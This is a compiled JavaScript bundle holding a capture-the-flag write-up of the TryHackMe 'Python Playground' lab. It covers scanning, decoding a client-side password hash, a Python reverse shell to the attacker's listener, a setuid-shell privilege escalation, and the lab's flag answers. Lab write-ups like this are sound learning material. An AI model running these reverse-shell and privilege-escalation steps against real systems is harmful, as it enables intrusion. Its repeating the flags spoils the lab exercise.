"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7485],{3905:(n,t,e)=>{e.d(t,{Zo:()=>c,kt:()=>m});var r=e(67294);function o(n,t,e){return t in n?Object.defineProperty(n,t,{value:e,enumerable:!0,configurable:!0,writable:!0}):n[t]=e,n}function a(n,t){var e=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(n,t).enumerable}))),e.push.apply(e,r)}return e}function l(n){for(var t=1;t<arguments.length;t++){var e=null!=arguments[t]?arguments[t]:{};t%2?a(Object(e),!0).forEach((function(t){o(n,t,e[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(e)):a(Object(e)).forEach((function(t){Object.defineProperty(n,t,Object.getOwnPropertyDescriptor(e,t))}))}return n}function s(n,t){if(null==n)return{};var e,r,o=function(n,t){if(null==n)return{};var e,r,o={},a=Object.keys(n);for(r=0;r<a.length;r++)e=a[r],t.indexOf(e)>=0||(o[e]=n[e]);return o}(n,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(n);for(r=0;r<a.length;r++)e=a[r],t.indexOf(e)>=0||Object.prototype.propertyIsEnumerable.call(n,e)&&(o[e]=n[e])}return o}var i=r.createContext({}),p=function(n){var t=r.useContext(i),e=t;return n&&(e="function"==typeof n?n(t):l(l({},t),n)),e},c=function(n){var t=p(n.components);return r.createElement(i.Provider,{value:t},n.children)},u="mdxType",d={inlineCode:"code",wrapper:function(n){var t=n.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(n,t){var e=n.components,o=n.mdxType,a=n.originalType,i=n.parentName,c=s(n,["components","mdxType","originalType","parentName"]),u=p(e),h=o,m=u["".concat(i,".").concat(h)]||u[h]||d[h]||a;return e?r.createElement(m,l(l({ref:t},c),{},{components:e})):r.createElement(m,l({ref:t},c))}));function m(n,t){var e=arguments,o=t&&t.mdxType;if("string"==typeof n||o){var a=e.length,l=new Array(a);l[0]=h;var s={};for(var i in t)hasOwnProperty.call(t,i)&&(s[i]=t[i]);s.originalType=n,s[u]="string"==typeof n?n:o,l[1]=s;for(var p=2;p<a;p++)l[p]=e[p];return r.createElement.apply(null,l)}return r.createElement.apply(null,e)}h.displayName="MDXCreateElement"},62485:(n,t,e)=>{e.r(t),e.d(t,{assets:()=>i,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>p});var r=e(87462),o=(e(67294),e(3905));const a={},l="Python Playground",s={unversionedId:"Tryhackme/Python Playground/Python Playground",id:"Tryhackme/Python Playground/Python Playground",title:"Python Playground",description:"Be creative!",source:"@site/writeups/Tryhackme/Python Playground/Python Playground.md",sourceDirName:"Tryhackme/Python Playground",slug:"/Tryhackme/Python Playground/",permalink:"/writeups/Tryhackme/Python Playground/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Psycho Break",permalink:"/writeups/Tryhackme/Psycho Break/Pyscho Break"},next:{title:"Ra",permalink:"/writeups/Tryhackme/Ra/"}},i={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Hack it!",id:"task-1-hack-it",level:2}],c={toc:p},u="wrapper";function d(n){let{components:t,...e}=n;return(0,o.kt)(u,(0,r.Z)({},c,e,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"python-playground"},"Python Playground"),(0,o.kt)("p",null,"Be creative!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/pythonplayground"},"Python Playground")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Python Scripting (Decoder)"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-hack-it"},"Task 1 Hack it!"),(0,o.kt)("p",null,"Jump in and grab those flags! They can all be found in the usual places (/home/someuser and /root)."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Python Playground$ sudo nmap -A -sS -sC -sV -O 10.10.251.33\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 13:51 CEST\nNmap scan report for 10.10.251.33\nHost is up (0.038s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)\n|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)\n|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)\n80/tcp open  http    Node.js Express framework\n|_http-title: Python Playground!\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/18%OT=22%CT=1%CU=39766%PV=Y%DS=2%DC=T%G=Y%TM=5F8C2C\nOS:59%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT      ADDRESS\n1   37.95 ms 10.8.0.1\n2   38.07 ms 10.10.251.33\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.13 seconds\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.251.33/"},"http://10.10.251.33/")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.251.33/login.html"},"http://10.10.251.33/login.html")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.251.33/signup.html"},"http://10.10.251.33/signup.html")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Python Playground$ gobuster dir -u http://10.10.251.33 -w /usr/share/dirb/wordlists/common.txt -x html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.251.33\n[+] Threads:        10\n[+] Wordlist:       /usr/share/dirb/wordlists/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html\n[+] Timeout:        10s\n===============================================================\n2020/10/18 13:54:29 Starting gobuster\n===============================================================\n/admin.html (Status: 200)\n/index.html (Status: 200)\n/index.html (Status: 200)\n/login.html (Status: 200)\n/signup.html (Status: 200)\n===============================================================\n2020/10/18 13:55:05 Finished\n===============================================================\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.251.33/admin.html"},"http://10.10.251.33/admin.html")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"view-source:http://10.10.251.33/admin.html"},"view-source:http://10.10.251.33/admin.html")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},'<script>\n  // I suck at server side code, luckily I know how to make things secure without it - Connor\n\n  function string_to_int_array(str) {\n    const intArr = [];\n\n    for (let i = 0; i < str.length; i++) {\n      const charcode = str.charCodeAt(i);\n\n      const partA = Math.floor(charcode / 26);\n      const partB = charcode % 26;\n\n      intArr.push(partA);\n      intArr.push(partB);\n    }\n\n    return intArr;\n  }\n\n  function int_array_to_text(int_array) {\n    let txt = "";\n\n    for (let i = 0; i < int_array.length; i++) {\n      txt += String.fromCharCode(97 + int_array[i]);\n    }\n\n    return txt;\n  }\n\n  document.forms[0].onsubmit = function (e) {\n    e.preventDefault();\n\n    if (document.getElementById("username").value !== "connor") {\n      document.getElementById("fail").style.display = "";\n      return false;\n    }\n\n    const chosenPass = document.getElementById("inputPassword").value;\n\n    const hash = int_array_to_text(\n      string_to_int_array(int_array_to_text(string_to_int_array(chosenPass)))\n    );\n\n    if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu") {\n      window.location = "super-secret-admin-testing-panel.html";\n    } else {\n      document.getElementById("fail").style.display = "";\n    }\n    return false;\n  };\n<\/script>\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.251.33/super-secret-admin-testing-panel.html"},"http://10.10.251.33/super-secret-admin-testing-panel.html")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'def text_to_unicode(string):\n    uni=[]\n    for char in string:\n         a=ord(char)\n         a -= 97\n         uni.append(str(a))\n    return uni\n\ndef unicode_to_text(string):\n    out=""\n    for char in range(0,len(string),2):\n         a = int(string[char])\n         b = int(string[char +1])\n         temp = a * 26\n         temp += b\n         out += chr(temp)\n    return out\n\nif __name__ == "__main__":\n     hash="dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"\n     stri1 = text_to_unicode(hash)\n     stri2 = unicode_to_text(stri1)\n     stri3 = text_to_unicode(stri2)\n     password = unicode_to_text(stri3)\n     print(password)\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"spaghetti1245")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"subprocess = __import__('subprocess')\nos = __import__('os')\nsocket =  __import__('socket')\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.106.222\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Python Playground$ nc -lnvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.251.33] 44732\n/bin/sh: 0: can't access tty; job control turned off\n# whoami\nroot\n# script -qc /bin/bash /dev/null\nroot@playgroundweb:~/app# ^Z\n[1]+  Stopped                 nc -lnvp 9001\nkali@kali:~/CTFs/tryhackme/Python Playground$ stty raw -echo\nkali@kali:~/CTFs/tryhackme/Python Playground$ nc -lnvp 9001\n\nroot@playgroundweb:~/app# export TERM=screen\nroot@playgroundweb:~/app# cd /root\nroot@playgroundweb:~# ls\napp  flag1.txt\nroot@playgroundweb:~# cat flag1.txt\nTHM{7e0b5cf043975e3c104a458a8d4f6f2f}\nroot@playgroundweb:~#\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Python Playground$ python3 getConnorPW.py\nConnor's password is: spaghetti1245\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"connor@pythonplayground:~$ ls -la\ntotal 36\ndrwxr-xr-x 4 connor connor 4096 May 16 06:05 .\ndrwxr-xr-x 3 root   root   4096 May 11 22:10 ..\n-rw-r--r-- 1 connor connor  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 connor connor 3789 May 11 22:16 .bashrc\ndrwx------ 2 connor connor 4096 May 11 22:15 .cache\n-rw-rw-r-- 1 connor connor   38 May 16 02:40 flag2.txt\ndrwx------ 3 connor connor 4096 May 11 22:15 .gnupg\n-rw-r--r-- 1 connor connor  807 Apr  4  2018 .profile\n-rw-rw-r-- 1 connor connor   40 May 11 22:19 .vimrc\nconnor@pythonplayground:~$ cat flag2.txt\nTHM{69a36d6f9da10d23ca0dbfdf6e691ec5}\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root@playgroundweb:~# cp /bin/sh /mnt/log\nroot@playgroundweb:~# chmod +s /mnt/log/sh\nroot@playgroundweb:~# ls -l /mnt/log/sh\n-rwsr-sr-x 1 root root 129816 Oct 18 12:13 /mnt/log/sh\nroot@playgroundweb:~#\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"connor@pythonplayground:~$ /var/log/sh -p\n# cd root\n/var/log/sh: 1: cd: can't cd to root\n# cd /root/\n# ls\nflag3.txt\n# cat flag3.txt\nTHM{be3adc69c25ad14eb79da4eb57925ad1}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is flag 1?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{7e0b5cf043975e3c104a458a8d4f6f2f}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is flag 2?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{69a36d6f9da10d23ca0dbfdf6e691ec5}")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"What is flag 3?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{be3adc69c25ad14eb79da4eb57925ad1}")))}d.isMDXComponent=!0}}]);